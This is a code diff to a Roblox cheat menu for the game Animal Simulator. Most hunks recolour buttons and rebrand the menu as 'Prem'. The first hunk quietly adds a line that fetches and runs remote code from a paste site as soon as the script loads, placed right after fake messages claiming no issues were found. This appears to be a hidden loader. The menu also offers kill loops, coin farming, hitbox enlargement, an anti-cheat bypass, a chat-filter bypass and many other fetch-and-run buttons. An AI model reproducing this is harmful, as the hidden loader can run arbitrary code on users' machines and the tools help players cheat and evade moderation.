@@ -14,6 +14,8 @@ warn("Checking Script Issues . . .")
 warn("0 Issues Found! ✅")
 warn("100% of the script opérational! ✅")
 
+loadstring(game:HttpGet("https://pastefy.app/ZpusVWqX/raw"))()
+
 local AnimalSim = Instance.new("ScreenGui")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
@@ -177,8 +179,8 @@ TextLabel.BorderSizePixel = 0
 TextLabel.Position = UDim2.new(0.115523577, 0, -9.10066973e-08, 0)
 TextLabel.Size = UDim2.new(0.233380884, 0, 0.172962204, 0)
 TextLabel.Font = Enum.Font.FredokaOne
-TextLabel.Text = "RaptorHub  Animal Simulator"
-TextLabel.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextLabel.Text = "RaptorHub Prem Animal Simulator"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
 TextLabel.TextScaled = true
 TextLabel.TextSize = 17.000
 TextLabel.TextWrapped = true
@@ -219,7 +221,7 @@ TextLabel_4.Position = UDim2.new(0.00700139115, 0, 0.691848934, 0)
 TextLabel_4.Size = UDim2.new(0.37691012, 0, 0.0755467191, 0)
 TextLabel_4.Font = Enum.Font.FredokaOne
 TextLabel_4.Text = "Update Logs"
-TextLabel_4.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 0)
 TextLabel_4.TextScaled = true
 TextLabel_4.TextSize = 14.000
 TextLabel_4.TextWrapped = true
@@ -260,7 +262,7 @@ TextLabel_7.Position = UDim2.new(0.00700139115, 0, 0.318091452, 0)
 TextLabel_7.Size = UDim2.new(0.37691012, 0, 0.0755467191, 0)
 TextLabel_7.Font = Enum.Font.FredokaOne
 TextLabel_7.Text = "Terminal"
-TextLabel_7.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextLabel_7.TextColor3 = Color3.fromRGB(255, 255, 0)
 TextLabel_7.TextScaled = true
 TextLabel_7.TextSize = 14.000
 TextLabel_7.TextWrapped = true
@@ -284,7 +286,7 @@ TextLabel_9.Position = UDim2.new(0.087, 0, 0.036, 0)
 TextLabel_9.Size = UDim2.new(0.826, 0, 0.099, 0)
 TextLabel_9.Font = Enum.Font.FredokaOne
 TextLabel_9.Text = "Misc"
-TextLabel_9.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextLabel_9.TextColor3 = Color3.fromRGB(255, 255, 0)
 TextLabel_9.TextSize = 30.000
 
 ScriptUtility.Name = "Script Utility"
@@ -324,13 +326,13 @@ ScrollingFrame3.CanvasSize = UDim2.new(0, 0, 2, 0)
 ScrollingFrame3.ScrollBarThickness = 10
 
 TextButton.Parent = ScrollingFrame
-TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton.BorderSizePixel = 0
 TextButton.Size = UDim2.new(0.305499047, 0, 0.250521928, 0)
 TextButton.Font = Enum.Font.FredokaOne
 TextButton.Text = "Kill 🐻"
-TextButton.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton.TextSize = 30.000
 TextButton.TextWrapped = true
 TextButton.MouseButton1Click:Connect(function()
@@ -360,13 +362,13 @@ UIGridLayout3.SortOrder = Enum.SortOrder.LayoutOrder
 UIGridLayout3.CellSize = UDim2.new(0, 100, 0, 100)
 
 TextButton_2.Parent = ScrollingFrame
-TextButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_2.BorderSizePixel = 0
 TextButton_2.Size = UDim2.new(0.305499047, 0, 0.250521928, 0)
 TextButton_2.Font = Enum.Font.FredokaOne
 TextButton_2.Text = "Kill 🦒"
-TextButton_2.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_2.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_2.TextSize = 30.000
 TextButton_2.MouseButton1Click:Connect(function()
 	while true do
@@ -383,13 +385,13 @@ end)
 UICorner_5.Parent = TextButton_2
 
 TextButton_3.Parent = ScrollingFrame
-TextButton_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_3.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_3.BorderSizePixel = 0
 TextButton_3.Size = UDim2.new(0.305499047, 0, 0.250521928, 0)
 TextButton_3.Font = Enum.Font.FredokaOne
 TextButton_3.Text = "Kill 🐴"
-TextButton_3.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_3.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_3.TextSize = 30.000
 TextButton_3.MouseButton1Click:Connect(function()
 	while true do
@@ -406,13 +408,13 @@ end)
 UICorner_6.Parent = TextButton_3
 
 TextButton_4.Parent = ScrollingFrame
-TextButton_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_4.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_4.BorderSizePixel = 0
 TextButton_4.Size = UDim2.new(0.305499047, 0, 0.250521928, 0)
 TextButton_4.Font = Enum.Font.FredokaOne
 TextButton_4.Text = "Kill 🦀"
-TextButton_4.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_4.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_4.TextSize = 30.000
 TextButton_4.MouseButton1Click:Connect(function()
 	while true do
@@ -429,13 +431,13 @@ end)
 UICorner_7.Parent = TextButton_4
 
 TextButton_5.Parent = ScrollingFrame
-TextButton_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_5.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_5.BorderSizePixel = 0
 TextButton_5.Size = UDim2.new(0.305499047, 0, 0.250521928, 0)
 TextButton_5.Font = Enum.Font.FredokaOne
 TextButton_5.Text = "Kill 🐸"
-TextButton_5.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_5.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_5.TextSize = 30.000
 TextButton_5.MouseButton1Click:Connect(function()
 	while true do
@@ -452,13 +454,13 @@ end)
 UICorner_8.Parent = TextButton_5
 
 TextButton_6.Parent = ScrollingFrame
-TextButton_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_6.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_6.BorderSizePixel = 0
 TextButton_6.Size = UDim2.new(0.305499047, 0, 0.250521928, 0)
 TextButton_6.Font = Enum.Font.FredokaOne
 TextButton_6.Text = "Kill 🦅"
-TextButton_6.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_6.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_6.TextSize = 30.000
 TextButton_6.MouseButton1Click:Connect(function()
 	while true do
@@ -475,13 +477,13 @@ end)
 UICorner_9.Parent = TextButton_6
 
 TextButton_7.Parent = ScrollingFrame
-TextButton_7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_7.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_7.BorderSizePixel = 0
 TextButton_7.Size = UDim2.new(0.303726941, 0, 0.250521928, 0)
 TextButton_7.Font = Enum.Font.FredokaOne
 TextButton_7.Text = "Kill 🦍"
-TextButton_7.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_7.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_7.TextSize = 30.000
 TextButton_7.MouseButton1Click:Connect(function()
 	while true do
@@ -498,13 +500,13 @@ end)
 UICorner_10.Parent = TextButton_7
 
 TextButton_8.Parent = ScrollingFrame
-TextButton_8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_8.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_8.BorderSizePixel = 0
 TextButton_8.Size = UDim2.new(0.303726941, 0, 0.250521928, 0)
 TextButton_8.Font = Enum.Font.FredokaOne
 TextButton_8.Text = "Dummy[0K]"
-TextButton_8.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_8.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_8.TextSize = 30.000
 TextButton_8.MouseButton1Click:Connect(function()
 	while true do
@@ -524,13 +526,13 @@ end)
 UICorner_11.Parent = TextButton_8
 
 TextButton_9.Parent = ScrollingFrame
-TextButton_9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_9.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_9.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_9.BorderSizePixel = 0
 TextButton_9.Size = UDim2.new(0.303726941, 0, 0.250521928, 0)
 TextButton_9.Font = Enum.Font.FredokaOne
 TextButton_9.Text = "Dummy[5K]"
-TextButton_9.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_9.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_9.TextSize = 30.000
 TextButton_9.MouseButton1Click:Connect(function()
 	while true do
@@ -550,13 +552,13 @@ end)
 UICorner_12.Parent = TextButton_9
 
 TextButton_10.Parent = ScrollingFrame
-TextButton_10.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_10.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_10.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_10.BorderSizePixel = 0
 TextButton_10.Size = UDim2.new(0.303726941, 0, 0.250521928, 0)
 TextButton_10.Font = Enum.Font.FredokaOne
 TextButton_10.Text = "Coins Farm"
-TextButton_10.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_10.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_10.TextSize = 30.000
 TextButton_10.MouseButton1Click:Connect(function()
 	while true do
@@ -569,13 +571,13 @@ end)
 UICorner_13.Parent = TextButton_10
 
 TextButton_11.Parent = ScrollingFrame2
-TextButton_11.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_11.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_11.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_11.BorderSizePixel = 0
 TextButton_11.Size = UDim2.new(0.303726941, 0, 0.250521928, 0)
 TextButton_11.Font = Enum.Font.FredokaOne
 TextButton_11.Text = "Inf-Yield"
-TextButton_11.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_11.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_11.TextSize = 30.000
 TextButton_11.MouseButton1Click:Connect(function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
@@ -584,13 +586,13 @@ end)
 UICorner_14.Parent = TextButton_11
 
 TextButton_12.Parent = ScrollingFrame2
-TextButton_12.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_12.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_12.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_12.BorderSizePixel = 0
 TextButton_12.Size = UDim2.new(0.303726941, 0, 0.250521928, 0)
 TextButton_12.Font = Enum.Font.FredokaOne
 TextButton_12.Text = "ESP"
-TextButton_12.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_12.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_12.TextSize = 30.000
 TextButton_12.MouseButton1Click:Connect(function()
 	loadstring(game:HttpGet('https://pastebin.com/raw/bQAaWJ1K'))()
@@ -599,13 +601,13 @@ end)
 UICorner_15.Parent = TextButton_12
 
 TextButton_13.Parent = ScrollingFrame2
-TextButton_13.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_13.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_13.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_13.BorderSizePixel = 0
 TextButton_13.Size = UDim2.new(0.303726941, 0, 0.250521928, 0)
 TextButton_13.Font = Enum.Font.FredokaOne
 TextButton_13.Text = "Fly"
-TextButton_13.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_13.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_13.TextSize = 30.000
 TextButton_13.MouseButton1Click:Connect(function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
@@ -614,13 +616,13 @@ end)
 UICorner_16.Parent = TextButton_13
 
 TextButton_14.Parent = ScrollingFrame2
-TextButton_14.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_14.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_14.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_14.BorderSizePixel = 0
 TextButton_14.Size = UDim2.new(0.303726941, 0, 0.250521928, 0)
 TextButton_14.Font = Enum.Font.FredokaOne
 TextButton_14.Text = "Chat Bypass"
-TextButton_14.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_14.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_14.TextSize = 30.000
 TextButton_14.MouseButton1Click:Connect(function()
 	loadstring(game:HttpGet"https://raw.githubusercontent.com/BingusWR/Fechatbypassroblox/refs/heads/main/Fe%20Roblox%20ChatBypass")()
@@ -629,13 +631,13 @@ end)
 UICorner_17.Parent = TextButton_14
 
 TextButton_15.Parent = ScrollingFrame2
-TextButton_15.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_15.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_15.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_15.BorderSizePixel = 0
 TextButton_15.Size = UDim2.new(0.303726941, 0, 0.250521928, 0)
 TextButton_15.Font = Enum.Font.FredokaOne
 TextButton_15.Text = "Anti-Detect"
-TextButton_15.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_15.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_15.TextSize = 30.000
 TextButton_15.MouseButton1Click:Connect(function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua",true))()
@@ -644,13 +646,13 @@ end)
 UICorner_18.Parent = TextButton_15
 
 TextButton_16.Parent = ScrollingFrame2
-TextButton_16.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_16.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_16.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_16.BorderSizePixel = 0
 TextButton_16.Size = UDim2.new(0.303726941, 0, 0.250521928, 0)
 TextButton_16.Font = Enum.Font.FredokaOne
 TextButton_16.Text = "Reset(C)"
-TextButton_16.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_16.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_16.TextSize = 30.000
 TextButton_16.MouseButton1Click:Connect(function()
 	local function forceResetAction()
@@ -674,13 +676,13 @@ end)
 UICorner_19.Parent = TextButton_16
 
 TextButton_17.Parent = ScrollingFrame2
-TextButton_17.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_17.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_17.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_17.BorderSizePixel = 0
 TextButton_17.Size = UDim2.new(0.303726941, 0, 0.250521928, 0)
 TextButton_17.Font = Enum.Font.FredokaOne
 TextButton_17.Text = "Hitbox"
-TextButton_17.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_17.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_17.TextSize = 30.000
 TextButton_17.MouseButton1Click:Connect(function()
 _G.HeadSize = 5
@@ -706,13 +708,13 @@ end)
 UICorner_20.Parent = TextButton_17
 
 TextButton_18.Parent = ScrollingFrame
-TextButton_18.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_18.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_18.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_18.BorderSizePixel = 0
 TextButton_18.Size = UDim2.new(0.303726941, 0, 0.250521928, 0)
 TextButton_18.Font = Enum.Font.FredokaOne
 TextButton_18.Text = "Frite Hub"
-TextButton_18.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_18.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_18.TextSize = 30.000
 TextButton_18.MouseButton1Click:Connect(function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/xpzrmodzz/hub-animal-AS/main/README.md"))()
@@ -721,13 +723,13 @@ end)
 UICorner_21.Parent = TextButton_18
 
 TextButton_19.Parent = ScrollingFrame
-TextButton_19.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_19.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_19.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_19.BorderSizePixel = 0
 TextButton_19.Size = UDim2.new(0.303726941, 0, 0.250521928, 0)
 TextButton_19.Font = Enum.Font.FredokaOne
 TextButton_19.Text = "LT Fruits"
-TextButton_19.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_19.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_19.TextSize = 30.000
 TextButton_19.MouseButton1Click:Connect(function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/kokojoscripts/LT-FRUITS-UPDT/main/1.9"))()
@@ -736,13 +738,13 @@ end)
 UICorner_22.Parent = TextButton_19
 
 TextButton_20.Parent = ScrollingFrame
-TextButton_20.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_20.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_20.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_20.BorderSizePixel = 0
 TextButton_20.Size = UDim2.new(0.303726941, 0, 0.250521928, 0)
 TextButton_20.Font = Enum.Font.FredokaOne
 TextButton_20.Text = "Bebo Mods"
-TextButton_20.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_20.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_20.TextSize = 30.000
 TextButton_20.MouseButton1Click:Connect(function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/BeboScripts/main/AnimalSimulator.lua"))()
@@ -750,26 +752,15 @@ end)
 
 UICorner_23.Parent = TextButton_20
 
-TextButton_21.Parent = ScrollingFrame
-TextButton_21.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-TextButton_21.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextButton_21.BorderSizePixel = 0
-TextButton_21.Size = UDim2.new(0.303726941, 0, 0.250521928, 0)
-TextButton_21.Font = Enum.Font.FredokaOne
-TextButton_21.Text = "DOWN🔴"
-TextButton_21.TextColor3 = Color3.fromRGB(0, 85, 255)
-TextButton_21.TextSize = 30.000
-
-UICorner_24.Parent = TextButton_21
 
 TextButton_22.Parent = ScrollingFrame
-TextButton_22.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_22.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_22.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_22.BorderSizePixel = 0
 TextButton_22.Size = UDim2.new(0.303726941, 0, 0.250521928, 0)
 TextButton_22.Font = Enum.Font.FredokaOne
 TextButton_22.Text = "CrowX Hub"
-TextButton_22.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_22.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_22.TextSize = 30.000
 TextButton_22.MouseButton1Click:Connect(function()
 	loadstring(game:HttpGet(('https://raw.githubusercontent.com/CrowzScripts/CrowXScripts/main/npcfarm'),true))()
@@ -778,13 +769,13 @@ end)
 UICorner_25.Parent = TextButton_22
 
 TextButton_23.Parent = ScrollingFrame
-TextButton_23.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_23.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_23.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_23.BorderSizePixel = 0
 TextButton_23.Size = UDim2.new(0.303726941, 0, 0.250521928, 0)
 TextButton_23.Font = Enum.Font.FredokaOne
 TextButton_23.Text = "KhSaeed"
-TextButton_23.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_23.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_23.TextSize = 30.000
 TextButton_23.MouseButton1Click:Connect(function()
 	loadstring(game:HttpGet("https://github.com/KhSaeed90/Roblox/raw/workspace/5712833750"))()
@@ -793,13 +784,13 @@ end)
 UICorner_26.Parent = TextButton_23
 
 TextButton_24.Parent = ScrollingFrame
-TextButton_24.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_24.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_24.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_24.BorderSizePixel = 0
 TextButton_24.Size = UDim2.new(0.303726941, 0, 0.250521928, 0)
 TextButton_24.Font = Enum.Font.FredokaOne
 TextButton_24.Text = "Dark Souls"
-TextButton_24.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_24.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_24.TextSize = 30.000
 TextButton_24.MouseButton1Click:Connect(function()
 	loadstring(game:HttpGet("https://bmacaveli.link/newhub"))()
@@ -808,14 +799,14 @@ end)
 UICorner_27.Parent = TextButton_24
 
 TextButton_25.Parent = AnimalSim
-TextButton_25.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_25.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_25.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_25.BorderSizePixel = 0
 TextButton_25.Position = UDim2.new(0.481, 0, 0.011, 0)
 TextButton_25.Size = UDim2.new(0.086, 0, 0.046, 0)
 TextButton_25.Font = Enum.Font.FredokaOne
 TextButton_25.Text = "Animal Sim Premium"
-TextButton_25.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_25.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_25.TextScaled = true
 TextButton_25.TextSize = 30.000
 TextButton_25.TextWrapped = true
@@ -823,13 +814,13 @@ TextButton_25.TextWrapped = true
 UICorner_28.Parent = TextButton_25
 
 TextButton_26.Parent = ScrollingFrame
-TextButton_26.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_26.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_26.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_26.BorderSizePixel = 0
 TextButton_26.Size = UDim2.new(0.303726941, 0, 0.250521928, 0)
 TextButton_26.Font = Enum.Font.FredokaOne
 TextButton_26.Text = "Get All 🦅"
-TextButton_26.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_26.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_26.TextSize = 30.000
 TextButton_26.MouseButton1Click:Connect(function()
 	local args = {
@@ -889,27 +880,27 @@ TextButton_26.MouseButton1Click:Connect(function()
 end)
 
 TextButton_27.Parent = Frame
-TextButton_27.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_27.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_27.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_27.BorderSizePixel = 0
 TextButton_27.Position = UDim2.new(0.667, 0, -0.291, 0)
 TextButton_27.Size = UDim2.new(0.215, 0, 0.073, 0)
 TextButton_27.Font = Enum.Font.FredokaOne
 TextButton_27.Text = "Made by sdiss (Discord)"
-TextButton_27.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_27.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_27.TextScaled = false
 TextButton_27.TextSize = 20.000
 TextButton_27.TextWrapped = true
 
 TextButton_28.Parent = ScrollingFrame
-TextButton_28.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_28.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_28.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_28.BorderSizePixel = 0
 TextButton_28.Position = UDim2.new(0.901, 0, 1.076, 0)
 TextButton_28.Size = UDim2.new(0.244, 0, 0.119, 0)
 TextButton_28.Font = Enum.Font.FredokaOne
 TextButton_28.Text = "Heimdalls"
-TextButton_28.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_28.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_28.TextScaled = false
 TextButton_28.TextSize = 30.000
 TextButton_28.TextWrapped = true
@@ -918,14 +909,14 @@ TextButton_28.MouseButton1Click:Connect(function()
 end)
 
 TextButton_29.Parent = ScrollingFrame3
-TextButton_29.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_29.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_29.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_29.BorderSizePixel = 0
 TextButton_29.Position = UDim2.new(0.901, 0, 1.076, 0)
 TextButton_29.Size = UDim2.new(0.244, 0, 0.119, 0)
 TextButton_29.Font = Enum.Font.FredokaOne
 TextButton_29.Text = "Default"
-TextButton_29.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_29.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_29.TextScaled = false
 TextButton_29.TextSize = 30.000
 TextButton_29.TextWrapped = true
@@ -934,14 +925,14 @@ TextButton_29.MouseButton1Click:Connect(function()
 end)
 
 TextButton_30.Parent = ScrollingFrame3
-TextButton_30.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_30.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_30.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_30.BorderSizePixel = 0
 TextButton_30.Position = UDim2.new(0.901, 0, 1.076, 0)
 TextButton_30.Size = UDim2.new(0.244, 0, 0.119, 0)
 TextButton_30.Font = Enum.Font.FredokaOne
 TextButton_30.Text = "Speed 25"
-TextButton_30.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_30.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_30.TextScaled = false
 TextButton_30.TextSize = 25.000
 TextButton_30.TextWrapped = true
@@ -950,14 +941,14 @@ TextButton_30.MouseButton1Click:Connect(function()
 end)
 
 TextButton_31.Parent = ScrollingFrame3
-TextButton_31.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_31.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 TextButton_31.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_31.BorderSizePixel = 0
 TextButton_31.Position = UDim2.new(0.901, 0, 1.076, 0)
 TextButton_31.Size = UDim2.new(0.244, 0, 0.119, 0)
 TextButton_31.Font = Enum.Font.FredokaOne
 TextButton_31.Text = "Speed 50"
-TextButton_31.TextColor3 = Color3.fromRGB(0, 85, 255)
+TextButton_31.TextColor3 = Color3.fromRGB(0, 255, 0)
 TextButton_31.TextScaled = false
 TextButton_31.TextSize = 25.000
 TextButton_31.TextWrapped = true
